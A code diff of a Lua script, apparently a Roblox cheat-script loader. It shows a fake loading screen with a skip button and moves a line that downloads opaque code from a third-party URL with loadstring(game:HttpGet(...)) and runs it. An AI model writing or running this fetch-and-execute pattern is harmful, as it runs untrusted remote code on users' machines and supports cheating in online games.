@@ -214,7 +214,6 @@ local function fadeOutGUI()
     gui:Destroy()
 end
 
-local skipTweenConnection
 local function showSkipButton()
     skipButton.Visible = true
     skipButton.Position = UDim2.new(0.5, -100, 0.85, -20)
@@ -226,13 +225,23 @@ local function showSkipButton()
 end
 
 local loadingComplete = false
+local scriptExecuted = false
+
+local function loadMainScript()
+    if scriptExecuted then return end
+    scriptExecuted = true
+    loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/8d6150f8cadccb27861339da3340df23f855488c3886d8e419028833c38d261e/download"))()
+end
+
 local function startLoading()
     fadeInTitle()
     task.wait(0.5)
     fadeInLoading()
     
     task.wait(4)
-    showSkipButton()
+    if not loadingComplete then
+        showSkipButton()
+    end
     
     local loadingStages = {
         {duration = 1, targetPercent = 10},
@@ -268,6 +277,7 @@ local function startLoading()
     end
     
     if not loadingComplete then
+        loadingComplete = true
         loadingLabel.Text = "Loading... 100%"
         task.wait(1)
         fadeOutGUI()
@@ -276,14 +286,8 @@ local function startLoading()
     end
 end
 
-function loadMainScript()
-    local mainScript = [[
-        print("Main script loaded successfully!")
-    ]]
-    loadstring(mainScript)()
-end
-
 skipButton.MouseButton1Click:Connect(function()
+    if loadingComplete then return end
     loadingComplete = true
     loadingLabel.Text = "Loading... 100%"
     task.wait(0.5)
@@ -293,5 +297,3 @@ skipButton.MouseButton1Click:Connect(function()
 end)
 
 task.spawn(startLoading)
-
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/8d6150f8cadccb27861339da3340df23f855488c3886d8e419028833c38d261e/download"))()
